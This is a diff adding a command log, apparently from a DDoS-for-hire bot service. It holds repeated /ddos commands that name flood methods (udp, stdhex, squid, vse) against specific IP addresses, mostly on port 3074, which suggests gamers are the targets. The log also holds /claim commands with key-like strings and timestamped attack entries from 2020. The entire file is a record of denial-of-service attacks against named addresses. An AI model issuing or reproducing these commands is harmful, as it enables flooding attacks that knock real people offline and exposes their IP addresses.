@@ -1,0 +1,52 @@
+/plans
+/plans
+/checkservers
+/ddos Godzilla 47.215.130.6 800 3074
+/claim
+/claim TRQX58HtlLB4tqAdoiymeWANMRNHMbUZgBDoeE6lHtO9jJ5Dhc
+/claim TRQG20K1BbN83PeDOoDm0wIx7hkioLFwxPGjYaVBG9LQ0uDqoV
+/claim TRinC2UAnEvAS85dCvN0TirBNABM3yVHOhNAqhfNDxplEigC8u
+/ddos Godzilla 47.215.130.6 800 3074
+/ddos Godzilla 47.215.130.6 3074 400
+/DDoS Godzilla 47.215.130.6 800 3074
+/sethost
+/ddos Godzilla udp 47.215.130.6 800 3074
+/ddos Godzilla udp 47.215.130.6 120 3074
+/ddos Kraken udp 47.215.130.6 120 3074
+/DDoS Kraken udp 47.215.130.6 120 3074
+/ping 47.215.130.6
+/sms
+/plan
+/methods
+/serverinfo
+/checkservers
+/DDoS Kraken udp 70.69.60.48 120 3074
+/ping 70.69.60.48
+/plan
+/methods
+/DDoS Kraken udp 70.190.234.135 120 3074
+/ping 70.190.234.135
+/ddos kraken udp 70.190.234.135 120 3074
+/ping 70.190.234.135
+/ping 70.190.234.135
+/methods
+/ddos kraken squid 70.190.234.135 120 3074
+/ddos kraken squid 70.190.234.135 120
+/serverinfo
+/check servers
+/checkservers
+/checkservers
+/plan
+/plan
+/ddos kraken stdhex 47.145.242.160 120 3074
+/ping 47.145.242.160
+/ddos kraken vse 47.145.242.160 120 3074
+/ddos kraken stdhex 47.145.242.160 120 80
+/ddos kraken stdhex 184.166.87.144 120 3074
+/ddos kraken stdhex 216.14.249.131 120 3074
+/ddos kraken stdhex 97.97.138.7 120 3074
+/tr4p
+/ddos kraken stdhex 187.189.208.52 120 3074
+[Thu Jul 30 2020 19:14:10 GMT-1100 (Samoa Standard Time)] /ddos kraken udp 108.185.228.232 120 3074
+[Thu Jul 30 2020 19:18:56 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 96.52.147.32 120 3074
+[Fri Aug 07 2020 20:15:58 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 47.154.201.164 120 3074
